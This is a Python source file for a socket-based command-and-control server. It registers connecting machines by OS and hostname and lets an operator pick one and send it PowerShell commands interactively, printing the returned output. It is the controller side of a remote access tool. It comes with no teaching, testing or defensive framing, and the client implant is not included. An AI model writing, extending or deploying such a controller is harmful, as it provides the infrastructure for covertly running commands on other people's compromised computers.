# server.py
import socket
import threading
import json
import sys
from typing import Dict, Union

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5000

# Data structure to hold connected clients
clients = {}
clients_lock = threading.Lock()     # Lock to protect clients data structure

def send_json(connection: socket.socket, data: Dict) -> None:
    """
    Send a JSON object over a socket connection
    """
    try:
        message = json.dumps(data) + "\n"
        connection.sendall(message.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

def receive_json(connection: socket.socket) -> Union[Dict, None]:
    """
    Receive a JSON object from a socket connection
    """
    try:
        buffer = ""
        while True:
            data = connection.recv(1024).decode()
            if not data:
                return None
            buffer += data
            if "\n" in buffer:
                line, buffer = buffer.split("\n", 1)
                return json.loads(line)
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None
    
def handle_client(connection: socket.socket, address: tuple) -> None:
    """
    Handle a client connection. This manages the client lifecycle, ensuring disconnections
    are cleaned up but does not process client messages directly.
    """
    global clients  # Use the global clients data structure

    try:
        client_info = receive_json(connection)
        if not client_info:
            print(f"Failed to receive client info from {address}")
            connection.close()
            return
    
        client_id = f"{address[0]}:{address[1]}"  # Use the client's IP address and port as the client ID
        with clients_lock:
            clients[client_id] = {
                "connection": connection,
                "address": address,
                "os": client_info.get("os", "Unknown"),
                "hostname": client_info.get("hostname", "Unknown")
            }
        print(f"Client {client_id} connected: {clients[client_id]['os']} {clients[client_id]['hostname']}")

        # Keep the thread alive until the client disconnects
        while True:
            try:
                # Check if the client is still connected by attempting to send a "heartbeat" packet
                connection.sendall(b"")  # An empty packet won't affect data flow
            except Exception:
                print(f"Client {client_id} disconnected")
                break
    except Exception as e:
        print(f"Error handling client {address}: {e}")
    finally:
        with clients_lock:
            if client_id in clients:
                del clients[client_id]
        print(f"Client {address} disconnected")
        connection.close()

def list_clients() -> None:
    """
    Enumerate the active clients
    """
    with clients_lock:
        if not clients:
            print("No active clients")
            return
        print("\nActive Clients:")
        print("{:<20} {:<15} {:<20}".format("Client ID", "OS", "Hostname"))
        print("-" * 60)
        for client_id, info in clients.items():
            print("{:<20} {:<15} {:<20}".format(client_id, info['os'], info['hostname']))
        print()

def select_client() -> None:
    """
    Select a client to interact with 
    """
    client_id = input("Enter Client ID (e.g., 192.168.1.10:54321): ").strip()
    with clients_lock:
        if client_id not in clients:
            print("Invalid client ID")
            return
        connection = clients[client_id]['connection']

    # Commanding the client until the server exits
    print(f"Interacting with client {client_id}. Enter PowerShell commands or type 'exit' to return.")
    while True:
        command = input("PS> ").strip()
        if command.lower() == "exit":
            break
        try:
            send_json(connection, {"command": command})
            response = receive_json(connection)
            if response and "output" in response:
                print(response["output"])
            else:
                print("No response or invalid response from the client")
        except Exception as e:
            print(f"Error sending command to client: {e}")
            break

def server_menu() -> None:
    """
    Display the server menu 
    """
    try:
        while True:
            print("\n--- Server Menu ---")
            print("1. List active clients")
            print("2. Select client to interact")
            print("3. Exit")
            choice = input("Choose an option: ").strip()
            if choice == '1':
                list_clients()
            elif choice == '2':
                select_client()
            elif choice == '3':
                print("Exiting server.")
                sys.exit(0)
            else:
                print("Invalid choice. Please try again.")
    except EOFError:
        print("Exiting server.")
        sys.exit(0)

def start_server() -> None:
    """
    Initiate the server
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)     # Up to 5 clients can wait in the queue
    print(f"Server listening on {SERVER_HOST}:{SERVER_PORT}")

    menu_thread = threading.Thread(target=server_menu, daemon=True)
    menu_thread.start()

    try:
        while True:
            connection, address = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(connection, address), daemon=True)
            client_thread.start()
    except KeyboardInterrupt:
        print("Shutting down server as requested")
    finally:
        server_socket.close()

if __name__ == "__main__":
    start_server()